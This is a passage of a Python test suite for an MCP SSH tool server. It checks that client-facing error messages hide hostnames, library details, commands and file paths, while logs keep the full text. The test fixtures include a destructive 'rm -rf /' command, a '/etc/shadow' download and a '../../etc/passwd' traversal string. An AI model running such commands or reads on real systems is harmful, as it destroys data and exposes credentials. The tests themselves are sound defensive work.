        tool = asyncio.run(mcp.get_tool(tool_name))
        result = tool.fn(**tool_kwargs)
        return json.loads(result)

    # ------------------------------------------------------------------
    # Tests
    # ------------------------------------------------------------------

    def test_ssh_connection_error_hides_hostname(self, tmp_path, monkeypatch):
        """SSHConnectionError must not leak hostname/port in message."""
        exc = SSHConnectionError(
            "Server 'prod-db-01.internal.example.com' not found. "
            "Available: staging, dev"
        )
        # Verify str(exc) carries full detail for logging
        assert "prod-db-01.internal.example.com" in str(exc)

        ssh_cm = self._make_ssh_manager_raise(exc)
        config = _make_minimal_config()
        payload = self._wire_and_call(
            tmp_path, monkeypatch, config, ssh_cm,
            "ssh_execute_command",
            server_name="testserver", command="hostname",
        )

        assert payload["error"] is True
        assert payload["error_type"] == "SSHConnectionError"
        assert payload["message"] == "SSH connection failed"
        # Must NOT leak the hostname
        assert "prod-db-01" not in payload["message"]
        assert "internal.example.com" not in payload["message"]

    def test_ssh_authentication_error_hides_paramiko_detail(self, tmp_path, monkeypatch):
        """SSHAuthenticationError must not leak paramiko strings in message."""
        exc = SSHAuthenticationError(
            "paramiko.AuthenticationException: auth failed for user admin"
        )
        assert "paramiko" in str(exc)

        ssh_cm = self._make_ssh_manager_raise(exc)
        config = _make_minimal_config()
        payload = self._wire_and_call(
            tmp_path, monkeypatch, config, ssh_cm,
            "ssh_execute_command",
            server_name="testserver", command="hostname",
        )

        assert payload["error"] is True
        assert payload["error_type"] == "SSHAuthenticationError"
        assert payload["message"] == "SSH authentication failed"
        assert "paramiko" not in payload["message"]
        assert "AuthenticationException" not in payload["message"]

    def test_ssh_timeout_error_hides_command(self, tmp_path, monkeypatch):
        """SSHTimeoutError must not leak the command that timed out."""
        exc = SSHTimeoutError(
            "Command 'rm -rf /' timed out after 30s"
        )
        assert "rm -rf /" in str(exc)

        ssh_cm = self._make_ssh_manager_raise(exc)
        config = _make_minimal_config()
        payload = self._wire_and_call(
            tmp_path, monkeypatch, config, ssh_cm,
            "ssh_execute_command",
            server_name="testserver", command="hostname",
        )

        assert payload["error"] is True
        assert payload["error_type"] == "SSHTimeoutError"
        assert payload["message"] == "Operation timed out"
        assert "rm -rf" not in payload["message"]
        assert "30s" not in payload["message"]
        # SSHTimeoutError is retryable
        assert payload["retryable"] is True

    def test_file_transfer_error_hides_file_path(self, tmp_path, monkeypatch):
        """FileTransferError must not leak file paths in message."""
        exc = FileTransferError(
            "Download failed: /etc/shadow"
        )
        assert "/etc/shadow" in str(exc)

        ssh_cm = self._make_ssh_manager_raise(exc)
        config = _make_minimal_config(
            ssh_targets={
                "testbox": {
                    "host": "192.168.1.100",
                    "port": 22,
                    "username": "testuser",
                    "password": "testpass",
                },
            },
            allowed_commands={
                "default": [
                    {"targets": ["*"], "commands": ["hostname", "cat"]},
                ],
                "api_keys": [],
                "networks": [],
            },
        )
        payload = self._wire_and_call(
            tmp_path, monkeypatch, config, ssh_cm,
            "ssh_download_file",
            server_name="testbox", remote_path="/tmp/test.txt",
        )

        assert payload["error"] is True
        assert payload["error_type"] == "FileTransferError"
        assert payload["message"] == "File transfer failed"
        assert "/etc/shadow" not in payload["message"]

    def test_path_validation_error_hides_traversal_detail(self, tmp_path, monkeypatch):
        """PathValidationError must not leak path-traversal detail in message."""
        exc = PathValidationError(
            "Path traversal detected: ../../etc/passwd"
        )
        assert "../../etc/passwd" in str(exc)

        ssh_cm = self._make_ssh_manager_raise(exc)
        config = _make_minimal_config(
            ssh_targets={
                "testbox": {
                    "host": "192.168.1.100",
                    "port": 22,
                    "username": "testuser",
                    "password": "testpass",
                },
            },
            allowed_commands={
                "default": [
                    {"targets": ["*"], "commands": ["hostname", "cat"]},
                ],
                "api_keys": [],
                "networks": [],
            },
        )
        payload = self._wire_and_call(
            tmp_path, monkeypatch, config, ssh_cm,
            "ssh_download_file",
            server_name="testbox", remote_path="/tmp/test.txt",
        )

        assert payload["error"] is True
        assert payload["error_type"] == "PathValidationError"
        assert payload["message"] == "Invalid file path"
        assert "traversal" not in payload["message"]
        assert "passwd" not in payload["message"]

    def test_str_exc_preserves_full_detail_for_logging(self):
        """``str(exc)`` must still carry the full internal message."""
        cases = [
            (
                SSHConnectionError("Server 'prod-db-01' not found"),
                "prod-db-01",
            ),
            (
                SSHAuthenticationError("paramiko auth failed"),
                "paramiko",
            ),
            (
                SSHTimeoutError("Command 'ls' timed out after 10s"),
                "timed out",
            ),
            (
                FileTransferError("Download failed: /etc/shadow"),
                "/etc/shadow",
            ),
            (
                PathValidationError("Path traversal: ../../etc/passwd"),
                "../../etc/passwd",
            ),
        ]
        for exc, expected_substring in cases:
            assert expected_substring in str(exc), (
                f"str({type(exc).__name__}) must contain "
                f"{expected_substring!r} for logging, got {str(exc)!r}"
            )
